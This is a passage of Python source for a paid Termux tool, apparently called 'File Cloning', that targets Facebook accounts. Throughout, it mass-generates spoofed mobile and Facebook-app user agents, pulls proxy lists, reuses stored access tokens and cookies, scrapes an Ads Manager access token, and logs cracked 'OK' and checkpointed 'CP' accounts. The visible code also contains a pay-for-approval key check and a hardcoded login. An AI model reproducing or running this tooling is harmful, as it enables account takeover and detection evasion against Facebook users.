  fbbv = str(random.randint(111111111,999999999))
  fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
  uazz = f'[FBAN/MobileAdsManagerAndroid;FBAV/{net}.0.0.21.117;FBPN/com.facebook.adsmanager;FBLC/en_US;FBBV/{fbbv};FBCR/null;FBMF/TECNO;FBBD/TECNO;FBDV/{poc};FBSV/12;FBCA/arm64-v8a;FBDM/'+'{density=2.75,width=1080,height=2216};FBOP/1;]'
  ugm = f"[FBAN/FB4A;FBAV/"+net+".0.0.77.46;FBBV/251145743;FBDM/{density=2.625,width=1080,height=1920};FBLC/pt_BR;FBRV/"+str(random.randint(000000000,999999999))+";FBCR/Zong;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/"+zov+";FBSV/11;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
  
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
prinCP=[]
try:
    prox= requests.get('https://github.com/MR-ALONE786/File-Cloning/blob/main/Approved.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
    prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='SamsungBrowser'
    e=random.randrange(100, 9999)
    f='NEO-AL00 Build/HUAWEINEO-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/537.36'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    
    aa='Mozilla/5.0 (Linux; Android 12'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='ANG-AN00 Build/HUAWEIANG-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,115)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for xd in range(1000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='RMX3491 Build/RKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108;]'
    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)
for ua in range(10000):
    a='Mozilla/5.0 (Symbian/55; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaX7-00'
    e=random.randrange(100, 9999)
    f='/021.004; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/533.4'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    aa='Mozilla/5.0 (Linux; Android 8.1.0)'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' GT-S5830L'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for ua in range(1000):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S5380D'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/2.0; ru-ru) AppleWebKit/534.20 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile HVGA SMM-MMS/1.2.0 OPN-B'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'

for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
for x in range(10000):
    aa='Mozilla/5.0 (Windows NT 6.1; WOW64)'
    b=random.choice(['4','5','6','7','8','9','10','11','12'])
    c='ASUS_I006D Build/RKQ1.201022.002'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.3'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36 Sleipnir/3.5.28'
    uakua=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uakua)
    

for xd in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='RMX3191 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome'
    d=random.randrange(10,200)
    e='0.4844.88 '
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/383.1.0.25.106;]'
    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)
    
for xd in range(9000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='CPH2269 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/348.0.0.8.103;]'
    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)
    
for xd in range(1000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='RMX3491 Build/RKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108;]'
    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)
for ua in range(10000):
    a='Mozilla/5.0 (Symbian/55; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaX7-00'
    e=random.randrange(100, 9999)
    f='/021.004; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/533.4'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    aa='Mozilla/5.0 (Linux; Android 8.1.0)'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' GT-S5830L'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for ua in range(1000):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S5380D'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/2.0; ru-ru) AppleWebKit/534.20 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile HVGA SMM-MMS/1.2.0 OPN-B'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'

for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
for x in range(10000):
    aa='Mozilla/5.0 (Windows NT 6.1; WOW64)'
    b=random.choice(['4','5','6','7','8','9','10','11','12'])
    c='ASUS_I006D Build/RKQ1.201022.002'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.3'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36 Sleipnir/3.5.28'
    uakua=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uakua)
    
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
        ua=open('bbnew.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
 
 

#------------[ HEART- ]--------------#
 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[38;5;50m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
 
###----------[ ANSII COLOR STYLE ]---------- ###
 
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
 
###----------[ RICH COLOR STYLE ]---------- ###
 
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu
 
#--------------------[ CONVERTER-BULAN ]--------------#
 
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
CPc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def TUTULj(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
#------------------[ MAIN ]-----------------#
#------------------[ MACHINE-SUPPORT ]---------------#
 
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
    os.system('clear')
def back():
    login()
def contact():
    os.system('xdg-open https://www.facebook.com/profile.php?id=100079298349066')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
os.system('xdg-open https://www.facebook.com/profile.php?id=100079298349066')
logo ="""
 ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
 ║\033[0;96m●▬▬▬▬▬๑🌸🕌۩[Bismillahir Rahmanir Rahim]۩🕌🌸๑▬▬▬▬▬▬●\033[0;91m║
 ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\33[0;91m███╗░░░███╗░█████╗░███╗░░░███╗██╗███╗░░██╗ 
\33[0;91m████╗░████║██╔══██╗████╗░████║██║████╗░██║ 
\33[0;91m██╔████╔██║██║░░██║██╔████╔██║██║██╔██╗██║ 
\33[0;91m██║╚██╔╝██║██║░░██║██║╚██╔╝██║██║██║╚████║ 
\33[0;91m██║░╚═╝░██║╚█████╔╝██║░╚═╝░██║██║██║░╚███║ 
\33[0;91m╚═╝░░░░░╚═╝░╚════╝░╚═╝░░░░░╚═╝╚═╝╚═╝░░╚══╝ 
 ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
 ║\33[0;95m[<🕌Assalamualaikum"Mind It,'You Will Never Alone🕴️>]\033[0;95m║
 ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[1;31m==================================================
[] AUTHOR       :      𝐌𝐑.𝐀𝐋𝐎𝐍𝐄 
[] TOOLS        :     𝐅𝐈𝐋𝐄-𝐂𝐋𝐎𝐍𝐈𝐍𝐆
[] TYPE         :      𝗣𝗔𝗜𝗗(𝐔𝐬𝐞𝐫 𝐎𝐧𝐥𝐲)
[] FACEBOOK     :      𝐀𝐋𝐎𝐍𝐄
[] VERSION      :      𝟔.𝟏
[] MESSENGER    :      𝗔𝗟𝗢𝗡𝗘 𝗧𝗲𝗿𝗺𝘂𝘅 𝗖𝗼𝗺𝗺𝘂𝗻𝗶𝘁𝘆
=================================================="\033[1;23m"""                                
balpakna =("""\x1b[38;5;50m══════════════════════════════════════════════════""")    
meyermarexudi =(""" \033[0;97m=============================================""")    
alltimexudi =(""" \033[32;1m[-] ONLY APPROVAL SYSTEM 7 DEYS 150TK 30 500TK FOR    APPROVAL""")
xudartimenai =(""" \033[32;1m[+] CONTACT ADMIN PLZ ENTAR""")
fuckyoursali =(""" \033[32;1m[𝟷] 𝚈𝙾𝚄𝚁 𝚃𝙾𝙺𝙴𝙽 𝙸𝚂 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝙰𝙿𝙿𝚁𝙾𝚅𝙴𝙳""")
xudinaministar =(""" \033[38;1m[-] Importent Note """)
hedaborakarent =(""" \033[35;1m[𝟸] 𝙵𝚄𝙲𝙺 𝙱𝚈𝙿𝙰𝚂𝙰𝚁 𝙲𝙷𝙰𝙺𝙴 𝚈𝙾𝚄𝚁 𝙳𝙰𝚃𝙰 ABAL😎 """)

                  #____APPROVAL SYSTEM ADD_____#
def meyexudi():
  os.system('clear')
  print(logo)
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/mominmominkd/momin19/blob/main/Afroveal5.txt').text
    if id in httpCaht:
      print(fuckyoursali)
      print(hedaborakarent)
      msg = str(os.geteuid())
      #time.sleep(0.5)
      print()
      pass
    else:
      print(meyermarexudi)
     # print(" \033[32;1m[+] Your Kay : "+id)
      print(' \x1b[38;5;208m╔══[𝟷]💥  FREE-FIRE-TIK-TOK- ID CLONING')      
      print(' \x1b[1;98m║══[𝟸]💥  ONLY ACTIVE ID CLONE 100%')
      print(' \x1b[1;93m║══[𝟸]💥  CP ID WILL BE LOGIN 80%')
      print(' \x1b[1;97m║══[𝟸]💥  WI-FI  AND DATA BOTH WORKING 100%')
      print(' \x1b[1;95m║══[𝟸]💥  15 DAY 250 TAKA ')
      print(' \x1b[38;5;50m║══[𝟸]💥  30 DAY 500 TAKA ')
      os.system('espeak -a 300 " Hello,   Sir,  Assalamualaikum,   I,   Am,    Robot,   of,   MR,   ALONE,    Please,   Send,   Your,   Key,"')
      print(" \x1b[0m║══[𝟸] YOUR KEY : "+id)
      input(' \033[1;30m╚══[𝟹] IF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801309177411?text='+tks),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
meyexudi()
#os.system("python ALONE.py")
def naima():
	print('-------------------')
print(logo)
os.system('espeak -a 300 " Please,   Text,   Your,   Real,   Name,   Sir,"')
uname =input('\033[1;91m[\033[1;91m•\033[1;91m]\033[1;33m WHAT IS YOUR NAME \033[1;91m: \33[1;31m')
os.system('espeak -a 300 " Welcome,   to,  MR.ALONE,  PAID,   Tools"')
def back():
	login()
	
	import getpass

attemps = 0

while attemps < 12345677901:
    username = input('\033[1;91m[\033[1;92m√\033[1;91m]\x1b[38;5;50m ENTER USERNAME: ')
    password = input('\033[1;95m[\033[1;95m√\033[1;95m]\x1b[38;5;50m ENTER PASSWORD: ')

    if username == 'MOMIN' and password == 'MOMIN':
        print(' \033[0;95mYou Have Successfully Logged in.')
        os.system('espeak -a 300 " Successfully,   Log,  In,  Sir"')
        break
    else:
        print(' Incorrect Pass Please Trying ')
        attemps += 1
        continue
os.system('clear')
pass
 
 
def login():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
        tokenku.append(token)
        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu(sy2,sy3)
        except KeyError:
            login_lagi334()
        except requests.exceptions.ConnectionError:
            print('\033[0;97m=================')
            animation(' [×] NO INTERNET CONNECTION DETECTED')
            exit()
    except IOError:
        login_lagi334()
def login_lagi334():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
        tokenku.append(token)
        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu(sy2,sy3)
        except KeyError:
            login_lagi334()
        except requests.exceptions.ConnectionError:
            print('\033[0;97m=================')
            animation(' [×] NO INTERNET CONNECTION DETECTED')
            exit()
    except IOError:
        login_lagi334()
def login_lagi334():
    try:
        os.system('clear')
        print(logo)
        ses = requests.Session()
        cookies = {'cookie':cookie}
        url = 'https://www.facebook.com/adsmanager/manage/campaigns'
        req = ses.get(url,cookies=cookies)
        set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
        nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
        roq = ses.get(nek,cookies=cookies)
        tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
        tokenw = open(".token.txt", "w").write(tok)
        cokiew = open(".cok.txt", "w").write(cookie)
      #exit()
    except Exception as e:
        os.system("rm -f .token.txt")
        os.system("rm -f .cok.txt")
        os.system("python nono.py")
        exit()

#------------------[ MENU ]----------------#
 #===©===#
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.040)
def menu():
    os.system('clear')
    print(logo)
    print(f"\033[95;1m[\033[95;1m+\033[95;1m] \033[1;95m𝐔𝐒𝐄𝐑 𝐍𝐀𝐌𝐄\033[1;91m :\033[1;96m "+uname)
    print("\033[97;1m[\033[92;1m•\033[97;1m] \033[0;93mTODAY'S DATE :\033[1;96m "+date)
    print('\033[0;97m===============================================')
    print(f"""\033[91;1m[\033[92;1m1\033[91;1m] \033[0;91m𝗙𝗜𝗟𝗘 𝗖𝗟𝗢𝗡𝗜𝗡𝗚         """)
    print("""\033[95;1m[\033[95;1m2\033[95;1m] \033[0;95m𝗖𝗢𝗡𝗧𝗔𝗖𝗧 ᏔᏆͲᎻ 𝗔𝗗𝗠𝗜𝗡""")
    print(f"""\033[93;1m[\033[93;1m3\033[93;1m] \033[93;1m𝗖𝗛𝗘𝗖𝗞 ϴᏦ 𝗜𝗗𝘇   """)
    print("""\033[98;1m[\033[98;1m0\033[98;1m] \033[0;98mᎬХᏆͲ""")
    print('\033[0;97m=================')
    HEART = input('\x1b\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mCHOOSE: ')
    if HEART in ['111']:
        login()
        dump_massal()
    elif HEART in ['1']:
        crack_file()
    elif HEART in ['2','02']:
        os.system('xdg-open https://github.com/Mr-Alon')
        os.system("python nono.py")
    elif HEART in ['3','03']:
        result()
    elif HEART in ['0']:
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookie.txt')
        print('\033[0;97m=================')
        animation(' [×] DONE EXIT ')
        exit()
    else:
        print('\033[0;97m=================')
        animation(' [×] SELECT CORRECTLY ')
        back()
 
      #-----------------[ HASIL-CRACK ]-----------------#
 
def result():
    os.system('clear')
    print(logo)
    print(' \033[96;1m[\033[96;1m1\033[96;1m] CHECK CP IDZ ')
    print(' \033[95;1m[\033[95;1m2\033[95;1m] CHECK OK IDZ ')
    print(' \033[94;1m[\033[94;1m3\033[94;1m] EXIT ')
    print('\033[0;91m==================')
    kz = input(' \033[95;1m[\033[95;1m•\033[95;1m]CHOOSE : ')
    if kz in ['1','01']:
        try:vin = os.listdir('CP')
        except FileNotFoundError:
            print('\033[0;91m==================')
            animation(' \033[96;1m[\033[92;1m•\033[976;1m] FILE NOT FOUND ')
            time.sleep(3)
            back()
        if len(vin)==0:
            print('\033[0;91m==================')
            animation(' \033[95;1m[\033[95;1m•\033[95;1m] NO CP RESULTS FOUND ')
            time.sleep(2)
            back()
        else:
            cih = 0
            lol = {}
